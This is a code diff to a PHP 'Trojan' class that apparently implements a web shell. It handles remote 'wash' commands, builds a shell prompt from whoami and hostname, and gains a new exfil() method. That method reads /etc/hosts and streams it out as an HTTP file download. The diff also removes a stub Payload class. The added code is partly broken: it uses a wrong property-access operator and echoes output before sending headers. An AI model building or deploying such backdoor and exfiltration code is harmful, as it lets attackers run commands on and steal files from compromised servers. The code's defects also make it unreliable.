@@ -1,13 +1,5 @@
 <?php
 
-class Payload{
-    public $description = 'A description of the payload goes here.';
-    public $options = array();
-    public function execute(){
-        return 'hacked';
-    }
-}
-
 // @todo: probably need to track some kind of options hash over here
 // @todo: it would be awesome to build a compatiblity layer for programs like 
 // top that don't (I don't think) write to stdout
@@ -30,7 +22,7 @@ class Trojan{
      * A generic constructor
      */
     public function __construct(){
-        # Require that $this->cwd always contains a meaningful value
+        # guarantee that $this->cwd always contains a meaningful value
         $this->cwd = trim(`pwd`);
     }
 
@@ -48,7 +40,8 @@ class Trojan{
 
         # process wash commands
         if($json['type'] == 'wash'){
-            $this->process_wash_command($json['cmd']);
+            //$this->process_wash_command($json['cmd']);
+            $this->exfil();
         }
     }
 
@@ -127,6 +120,53 @@ class Trojan{
         $line_terminator      =  ($whoami ===  'root') ? '#' : '$' ;
         $this->prompt_context =  "{$whoami}@{$hostname}:{$this->cwd}{$line_terminator}";
         return $this->prompt_context;
+    }
+
+
+
+
+
+
+
+
+    /**
+     * Exfiltrates a file
+     *
+     * @param string $file             The file to download
+     */
+    public function exfil($file = 'blah'){
+
+        $this->prompt_context = 'wash.blah';
+
+        $response = array(
+            'prompt_context' => $this.prompt_context,
+            'output'         => 'Exfiltrating file.',
+            //'error'          => $error,
+        );
+
+
+        # assemble and send a JSON-encoded response
+        $json = json_encode($response);
+        echo $json;
+        
+
+        $file = '/etc/hosts';
+        if (file_exists($file)) {
+            header('Content-Description: File Transfer');
+            header('Content-Type: application/octet-stream');
+            header('Content-Disposition: attachment; filename='.basename($file));
+            header('Content-Transfer-Encoding: binary');
+            header('Expires: 0');
+            header('Cache-Control: must-revalidate');
+            header('Pragma: public');
+            header('Content-Length: ' . filesize($file));
+            ob_clean();
+            flush();
+            readfile($file);
+            die();
+        }
+
+
     }
 }
 
